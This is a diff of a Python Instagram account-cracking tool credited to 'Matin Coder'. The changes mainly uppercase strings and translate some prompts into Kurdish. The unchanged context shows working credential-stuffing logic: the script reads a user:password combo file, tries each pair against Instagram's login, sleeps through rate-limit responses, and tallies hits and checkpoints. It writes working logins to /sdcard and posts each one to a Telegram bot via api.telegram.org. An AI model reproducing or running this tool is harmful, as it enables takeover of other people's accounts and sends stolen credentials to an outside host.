@@ -37,10 +37,10 @@ logo1=G+'''
                                             
 
 '''+W+''' ---------------------------------------------------
-'''+wd+''' ➣ Author   : Matin Coder
- ➣ GitHub   : https://github.com/matin-1879
- ➣ YouTube  : Team 1879
- ➣ telegram : https://t.me/Team1879
+'''+wd+''' ➣ AUTHOR   : Matin Coder
+ ➣ GITHUB   : https://github.com/matin-1879
+ ➣ YOUTUBE  : Team 1879
+ ➣ TELEGRAM : https://t.me/Team1879
  '''+W+'''---------------------------------------------------'''
 logo2=G+'''
 
@@ -56,23 +56,23 @@ logo2=G+'''
                                             
 
 '''+W+''' ---------------------------------------------------
- '''+wd+'''➣ Author   : Matin Coder
- ➣ GitHub   : https://github.com/matin-1879
- ➣ YouTube  : Team 1879
- ➣ telegram : https://t.me/Team1879
+ '''+wd+'''➣ AUTHOR   : Matin Coder
+ ➣ GITHUB   : https://github.com/matin-1879
+ ➣ YOUTUBE  : Team 1879
+ ➣ TELEGRAM : https://t.me/Team1879
 '''+W+''' ---------------------------------------------------
 
 '''+W+''' ---------------------------------------------------
- '''+wd+'''  Crack instgram it started !
-    please wait .. 1h or 2h 
-    Prosess in Background !...... 
+ '''+wd+'''  CRACK INSTAGRAM IT STARTET !
+    PLEASE WAIT .. 1H OR 2H 
+    PROSESS IN BACKGROUND !...... 
 '''+W+''' ---------------------------------------------------
  '''
 print(logo1)
-agar=input(" You Want To Bot TELEGRAM Your Results (y,yes or n,no) ")
+agar=input(" ATAWET HITAKAN BO TELEGRAM BETAWA (YES OR NO) ")
 if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-    ID=input(" Your ID Telegram :")
-    token=input(" Token(bot) : ")
+    ID=input(" YOUR ID TELEGRAM :")
+    token=input(" TOKEN (BOT) : ")
 else:
     pass
 print(W+' ---------------------------------------------------')
@@ -101,7 +101,7 @@ def instagram1():
 	import os, sys
 	def loopPp():
 		try:
-			combo=input(" Path File :")
+			combo=input(" NAWI COMBO :")
 			file = open(combo,'r').read().splitlines()
 			global bad, timeout, checkpoint, error, hits, ID, token
 			for line in file:
@@ -138,19 +138,19 @@ def instagram1():
 						os.system("clear")
 						print(logo2)
 						bad+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CHEAKPOINT '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' BAD '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'TIMEOUT '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' ERROR'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 					elif '"message":"Please wait a few minutes before you try again."' in login:
 						os.system("clear")
 						print(logo2)
 						timeout+=1
 						import time
-						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CHEAKPOINT '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' BAD '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'TIMEOUT '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' ERROR'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 						time.sleep(330)
 					elif 'userId' in login:
 						os.system("clear")
 						print(logo2)
 						hits+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CHEAKPOINT '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' BAD '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'TIMEOUT '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' ERROR'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 						boooom=f"GOOD: "+user+":"+pasw
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
 						with open('/sdcard/Good(instgram).txt', 'a') as ff:
@@ -159,16 +159,16 @@ def instagram1():
 						os.system("clear")
 						print(logo2)
 						checkpoint+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CHEAKPOINT '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' BAD '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'TIMEOUT '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' ERROR'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 					else:
 						os.system("clear")
 						print(logo2)
 						error+=1
-						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CHEAKPOINT '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' BAD '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'TIMEOUT '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' ERROR'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 				except:
-					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' CHEAKPOINT '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' BAD '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'TIMEOUT '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' ERROR'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 		except FileNotFoundError:
-			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
+			print("COMBOKA LA MOBILET SAVE NIA")
 	loopPp()
 	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
    
